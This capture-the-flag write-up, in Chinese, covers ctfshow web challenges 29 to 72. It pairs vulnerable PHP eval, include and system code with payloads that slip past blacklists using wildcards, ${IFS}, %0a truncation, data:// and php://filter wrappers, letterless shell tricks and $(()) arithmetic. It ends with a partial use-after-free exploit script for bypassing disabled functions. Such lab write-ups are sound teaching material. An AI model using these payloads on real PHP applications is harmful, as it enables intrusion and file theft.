

## web29（通配符）

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
eval函数是把字符串作为PHP代码执行，过滤了flag，用通配符绕过
payload：/?c=&#96;tac fla?.php&#96;;  

## web30（反引号代替system）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
相比于上一题多过滤了system，php，php中，system可用反引号`绕过，php也用通配符绕过
这里要用echo将执行结果输出一下，不然没有回显
payload：/?c=echo `tac fla?.???`;

## web31（空格绕过）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
增加了过滤，相比于上一题多过滤了空格和点，点用通配符绕过
收集一下空格绕过姿势：/**/，%0a换行符，%09制表符，其他姿势还有${IFS}，<，<>，{tac,*}
payload：/?c=echo/**/`tac%09f???????`;
## web32（include逃逸）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
过滤了挺多的，反引号过滤了，就不能执行system命令了，左括号过滤了，一些函数也不能用了
这里使用include包含方法，包含一个get请求，分号过滤就用?>进行闭合，后面对2进行传参，包含flag.php，直接包含是读不到的，使用php伪协议进行base64编码，然后将回显内容解base64即可
payload：/?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
## web33（include逃逸）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
接着逃
payload：/?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
或者
GET：/?c=include$_POST[2]?>
POST：2=php://filter/convert.base64-encode/resource=flag.php
## web34（include逃逸）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
## web35（include逃逸）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=include$_GET[2]?>&2=php://filter/convert.base64-encode/resource=flag.php
## web36（include逃逸）
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```
过滤了数字，换个传参
payload：/?c=include$_GET[a]?%3E&a=php://filter/convert.base64-encode/resource=flag.php
## web37（data，input伪协议）
```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```
使用php的data伪协议去读
payload：/?c=data:text/plain,<?php system('tac fla?.php')?>
或/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
或（注意post传参为x-www-form-urlencoded raw，意味传递任意格式文本，如果这里不是raw的话post会将其转换为键值对导致代码无法执行）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637843452688-976476c6-c4d7-4b91-b205-ae96395ce232.png#clientId=ub553509b-7999-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=124&id=uc8a964f2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=247&originWidth=1153&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28401&status=done&style=none&taskId=ubea90b37-50e0-4e15-9d5c-026b58e4f17&title=&width=576.5)
## web38（data伪协议）
```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```
过滤了php，那么带php的伪协议都不能用了，这里使用data
payload：/?c=data://text/plain,<?=`tac *`;
## web39（data伪协议）
```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```
强制加了一个后缀，不过没什么吊用，payload最后已经闭合，代码必然会执行。
web38不用闭合也能出，但这个题就必须要闭合
payload：/?c=data://text/plain,<?=`tac *`;?>
## web40（各种php函数）
```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```
好家伙，这个过滤，看来只能用php内置函数了
介绍几个函数：

- localeconv() 返回包含本地数字及货币信息格式的数组，第一个元素通常是点.
- pos() 返回数组中当前元素的值，等价的还有current() reset()
- scandir() 列出目录中的文件和目录
- array_reverse() 数组逆序输出
- next() 取数组下一个元素，默认是取第二个
- show_source() 查看代码

接下来就可以打出一套组合拳：

- 构造pos(localeconv())得到.
- scandir(pos(localeconv()))得到scandir(.)即扫描当前目录下所有文件，本题猜测应该是 . .. flag.php index.php 
- array_reverse(scandir(pos(localeconv())))逆序输出得到index.php flag.php .. .
- next(array_reverse(scandir(pos(localeconv()))))得到flag.php
- show_source(next(array_reverse(scandir(pos(localeconv())))))得到flag.php内容

最后payload：/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
## web41（待完成）


## web42（%0a截断）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```
> /dev/null 2>&1
默认情况是1，也就是等同于1>/dev/null 2>&1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”

这个题看样子是会将执行结果输入到一个地方，不在页面上回显，我们可以使用换行符截断
payload：/?c=tac *%0a
## web43（%0a截断）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=tac *%0a
## web44（%0a截断）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=tac *%0a
## web45（空格绕过）
```php
<?php
  
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
payload：/?c=tac${IFS}*%0a
## web46（%09绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
过滤了通配符、$，这次使用制表符%09绕过空格
payload：/?c=tac%09fla?????%0a
其他姿势：/?c=tac<fla''g.php%0a   /?c=tac<fla''g.php||
## web47（%09绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=tac%09fla?.php%0a
## web48（%09绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
同上
payload：/?c=tac%09fla?.php%0a
## web49（%09绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
同上，这里虽然过滤了%，但是%09会被优先解析成制表符，也就是说先经过浏览器一次url解码，再进行传参
payload：/?c=tac%09fla?.php%0a
## web50（''绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
这一次把制表符过滤了，那就换个姿势，发现在使用<代替空格的时候通配符貌似就不起作用了，所以使用''来绕过flag的匹配，此外使用转义符也是可行的，除了一些特殊字符转义后会成为其他字符外，剩下的转义后还是本身，等同于没转义
payload：/?c=tac<fla''g.php%0a或/?c=tac<fla\g.php%0a
## web51（''绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
过滤了tac，其他常见的打印命令也ban了，其实还有个nl可用，执行后回显1，右键查看源码得到flag
payload：/?c=nl<fl''ag.php%0a
## web52（${IFS}绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
这个题过滤了<，绕过空格还有${IFS}可用
payload：/?c=nl${IFS}fla?.???%0a
查看源码发现
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853342916-eb9219b4-c9cd-49bf-be86-abe257504657.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u7fe19710&margin=%5Bobject%20Object%5D&name=image.png&originHeight=35&originWidth=215&originalType=binary&ratio=1&rotation=0&showTitle=false&size=703&status=done&style=none&taskId=ubdace4ad-cc48-4e7c-967b-04871ae224c&title=&width=307)
？？？我的flag呢，看下目录payload：/?c=ls%0a
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853425951-9563e023-b815-4ea2-99fe-0969929a129f.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u2ac2405d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=53&originWidth=217&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1553&status=done&style=none&taskId=ue31fafed-6d8f-4abb-a757-305af2dc745&title=&width=205)
看来flag不在此处，看看根目录payload：/?c=ls${IFS}/%0a
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853470065-f03fafa3-81c1-45fc-b368-4eebab029915.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u4d809a1a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3869&status=done&style=none&taskId=u39ed1a66-aa60-424b-8eda-565935ca680&title=&width=1013)
第四个文件叫flag，进去看看payload：/?c=nl${IFS}/fla?%0a
答案回显在页面上，完活儿
## web53（${IFS}绕过）
```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```
比较简单，不过ls后有个readflag的elf文件，不知道是干啥的
payload：/?c=nl${IFS}fla?.php
## web54（/bin/cat）
```php
<?php


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
？？？这个过滤看起来丧心病狂，能用的几乎都ban了，思路是用其他方式执行打印，比如执行cat就去/bin/cat调用等等，这些通常都是存储在/bin目录下的
payload：/?c=/bin/ca?${IFS}f?ag.php
右键查看源码即可得到flag
## web55（无字母命令执行）
```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
这道题过滤了字母，看了大佬文章才逐渐理解，这里主要是复现
推荐：[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
有两个有趣的知识点：

1. shell下可以利用.来执行任意脚本
1. Linux文件名支持用glob通配符代替

.相当于source，执行一个文件中的命令，那和这题有什么关系呢，我们知道，上传到服务器的文件通常会被创建一个副本保存在指定目录下，而默认目录一般是/tmp/phpXXXXXX，最后六个字符是随机的大小写字母。那我们是不是就可以利用source去执行这个文件呢，确实可以，可以通过构造一个POST数据包进行上传，然后执行服务器上的临时文件，但是文件名有六个字母未知怎么办。可以区分的是，tmp目录下其中的文件是不会有大写字母的，换句话说，最后一个字符是不会出现大写字母的，而恰巧我们上传的文件会有概率被分配到一个包含大写字母的文件名，这一点是区分关键。
接下来是通配符，我们可以用/???/?????????表示/tmp/phpXXXXXX的所有文件，如果要表示大写字符，可以用[@-[]表示，意思是匹配ASCII码在@-[之前所有的字符，而这个区间对应的正好是A-Z
所以payload为：/?c=.+/???/????????[@-[]

- 第一步：构造一个POST请求上传文件
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <!--链接请自行更换-->
<form action="http://200f2114-2431-4ddf-beaf-ac717d3fbfe6.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

- 第二步，随便上传个文件，然后抓包，在GET中传入参数执行，POST传入shell命令执行

![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637857221048-80f612cf-8451-49f7-9be3-a8a8ee96440c.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=ud7f3cd56&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69874&status=done&style=none&taskId=u58f753fe-ec44-4ef1-ab31-90800cbb801&title=&width=764)
因为每次上传文件名都是随机的，可能不会一次成功，要多发几次包，看到目录文件后继续查看
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637857330375-64accbc9-1585-4be3-945e-e6d9d282327e.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u7a566341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86471&status=done&style=none&taskId=u95b42a1e-df51-453f-a663-93d7bb21bc4&title=&width=796)
成功读到flag
## web56（无数字字母命令执行）
```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
同web55
## web57（$(())）
```php
<?php

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```
这个题要传参c=36，但是由过滤了数字，可以考虑如下方式绕过
看这个例子
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860730620-1abfb4d1-6da2-4059-8157-4af44c08a0aa.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=100&id=u88d4d697&margin=%5Bobject%20Object%5D&name=image.png&originHeight=99&originWidth=265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44848&status=done&style=none&taskId=u1990f488-9e97-49fc-ace7-dd8a13fb14e&title=&width=268)
为什么会输出0呢，因为在shell中$(())可做运算，当参数为空时，打印0，那如何得到36呢，我们对0取反，得到是-1，然后用37个-1相加得到-37，最后再取反就得到36了
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860973823-e1cea168-21e7-4251-bd72-3f0ceef253e2.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=100&id=u51b24e4c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37461&status=done&style=none&taskId=uc27c57ca-7f2c-4686-9a54-26fac61a10d&title=&width=320)
得到-1
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861295855-95cea956-3cf8-43ec-82fd-f1be6b1e35a0.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=150&id=u125e3e20&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=1131&originalType=binary&ratio=1&rotation=0&showTitle=false&size=395325&status=done&style=none&taskId=uaa385bd6-1097-4607-a296-62da347de06&title=&width=902)
37次运算后得到-37，最后取反得到36
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861257944-40d23a4b-f17e-4f60-87d2-95400dff3a7e.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=150&id=u8f600c46&margin=%5Bobject%20Object%5D&name=image.png&originHeight=194&originWidth=1119&originalType=binary&ratio=1&rotation=0&showTitle=false&size=402152&status=done&style=none&taskId=uae63e0a0-e079-4ae6-923e-a54f164cf81&title=&width=865)
```
payload：/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```
右键查看源码即可获得flag
## web58-65（突破禁用函数）
```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```
这8个题可以通杀
payload：c=show_source('flag.php');
## web66（突破禁用函数）
```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```
show_source被禁用了，尝试另一种：c=highlight_file('flag.php');
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861897471-ec1e3db6-0ebf-47e0-819a-422f51ff73ed.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=ua61a51d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=985&status=done&style=none&taskId=ub9eac542-67ec-40f6-864a-f2b06ed1db2&title=&width=306)
好家伙，看来路径变了，先看看都有哪些文件吧：c=print_r(scandir('.'));
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862019048-dc174cac-ee38-4042-9b11-ae2b8774cec3.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=300&id=u4b0e3639&margin=%5Bobject%20Object%5D&name=image.png&originHeight=541&originWidth=1197&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49088&status=done&style=none&taskId=u8bb22d52-5109-482a-97bf-29a5182cb3b&title=&width=664)
当前目录没有，再瞅一眼根目录：c=print_r(scandir('/'));
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862111503-ac782c87-2950-4218-b1ad-e2133bcd7456.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=300&id=u48c8480d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=558&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56736&status=done&style=none&taskId=u00a4038f-c719-47b8-b1cb-fef95db0f0c&title=&width=639)
找到你了！可恶的flag.txt
最终payload：c=highlight_file('/flag.txt');
## web67（突破禁用函数）
```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```
尝试后发现print_r被禁用了，这次使用var_dump打印，按照上题的思路，查看根目录
payload: c=var_dump(scandir('/'));
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894193264-98070937-927a-40ef-8c66-610fd4c3cb1f.png#clientId=uf61a1eb9-8a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u634a8b9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=543&originWidth=959&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69436&status=done&style=none&taskId=u21050625-fb2c-456e-8e2a-3ecb309a04b&title=&width=618)
于是最终payload：c=highlight_file('/flag.txt');
## web68（突破禁用函数）
```php
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
```
代码看不到了，看报错是因为highlight_file()被禁用了，一样，看一眼根目录，找到flag.txt
payload：c=var_dump(scandir('/'));
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894386021-ca8d69b4-6cc8-4d85-902f-a02477ddbafd.png#clientId=uf61a1eb9-8a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=450&id=u19690b8e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=969&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74679&status=done&style=none&taskId=u3dfc4f6a-8f4a-44e8-a489-10440facf71&title=&width=651)
这次使用include包含flag.txt
payload：c=include('/flag.txt');
还可以用require函数，文档是这样说的：
> **include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。**
> **include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：**
> - **require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。**
> - **include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。**

## web69（突破禁用函数）
打开一看，还是highlight_file()函数被禁用，var_dump也被禁用了，这次使用var_export()
以下是文档说明
> **var_export() 函数用于输出或返回一个变量，以字符串形式表示。**
> **var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。**
> **PHP 版本要求: PHP 4 >= 4.2.0, PHP 5, PHP 7**

payload：c=var_export(scandir('/'));打印根目录文件
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637895933556-8c24e369-4599-4a9d-81bb-1d80eaa94e87.png#clientId=u4e321334-5d46-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u27c83bc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=549&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57096&status=done&style=none&taskId=u5f368a1b-c21a-4a03-ae53-d7c5db5b038&title=&width=647)
最终payload：c=include('/flag.txt');
## web70（突破禁用函数）
```php

Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
你要上天吗？
```
没什么难度，和上一题一样的操作
最终payload：c=include('/flag.txt');
## web71（突破禁用函数）
```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```
看源码后得知会将命令执行后的结果中的数字字母全部替换为?，让我们无法查看，解决也很简单，在第8行执行完eval后让代码结束即可。
最终payload：c=include('/flag.txt');exit(); 
## web72（uaf脚本）
```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```
代码上没啥变化，但是实操中发现之前的姿势都不能用了，而且也不知道文件位置，先看一下当前目录
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637898487369-27008bf0-2f0c-49d1-b522-95e270b22b7b.png#clientId=u024a4150-3604-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=uceae531c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=638&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67093&status=done&style=none&taskId=u29cec3aa-110e-444c-b8ec-a02568b034f&title=&width=601)
没什么问题，看一下根目录
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637898550042-11019791-7c2a-4b1d-9d02-180289212956.png#clientId=u024a4150-3604-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=ud3bd15ee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=625&originWidth=1119&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69705&status=done&style=none&taskId=u3fc8989a-ccb0-435c-9247-7ee39525bef&title=&width=627)
根目录貌似无法查看了，换个姿势
```php
payload：
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
```
这里?>是闭合前面的php，让我们后面的php生效，既然直接读不可行，那么就间接来读，遍历根目录下所有文件，然后逐次打印
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637899253051-09d3c32c-e7b7-4343-89be-d4477b8258d5.png#clientId=u024a4150-3604-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=uc969f4a5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=796&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85783&status=done&style=none&taskId=u7b68611d-2124-4f32-90df-8bab2f3d383&title=&width=577)
发现flag0.txt，应该就是要找的文件了，这里直接读也是不行的，看了其他师傅的方法是要用uaf脚本进行命令执行，脚本如下，执行时要url编码
```php
<?php

function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

